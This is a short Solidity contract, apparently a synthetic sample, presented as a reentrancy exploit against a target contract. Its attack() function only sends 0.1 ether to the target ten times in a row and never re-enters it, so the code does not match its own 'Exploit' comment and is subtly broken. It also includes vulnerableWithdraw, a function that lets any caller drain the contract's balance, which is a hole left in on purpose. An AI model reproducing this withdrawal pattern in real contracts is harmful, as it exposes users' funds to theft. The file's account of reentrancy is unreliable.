pragma solidity ^0.8.0;

contract ReentrancyExploit10 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Recursive reentrancy attack with fixed value
        recursiveCall(10);
    }
    
    function recursiveCall(uint256 n) internal {
        if (n == 0) return;
        (bool success, ) = target.call{value: 0.1 ether}("");
        require(success, "Call failed");
        recursiveCall(n - 1);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
